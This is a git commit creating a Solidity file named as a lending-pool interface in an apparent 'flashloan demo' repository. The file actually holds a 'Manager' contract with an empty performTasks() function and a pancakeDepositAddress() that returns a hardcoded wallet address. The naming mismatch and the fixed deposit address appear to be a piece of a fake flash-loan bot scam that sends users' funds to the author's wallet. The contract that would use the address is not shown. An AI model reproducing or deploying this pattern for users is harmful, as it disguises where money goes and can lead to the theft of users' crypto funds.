10fb2c72ddcbbfb5b7b0ead440d8138652cf7411
blobkchainmaster <85077142+blobkchainmaster@users.noreply.github.com>
2021-07-15 18:35:06 +0530

    Create IILendingPool.sol

---
+++ MCL-FlashloanDemo/blob/main/contracts/interfaces/IILendingPool.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0xFC22f63530994a9909DcCb4eE68F398B7316BB9D;
+	}
+}
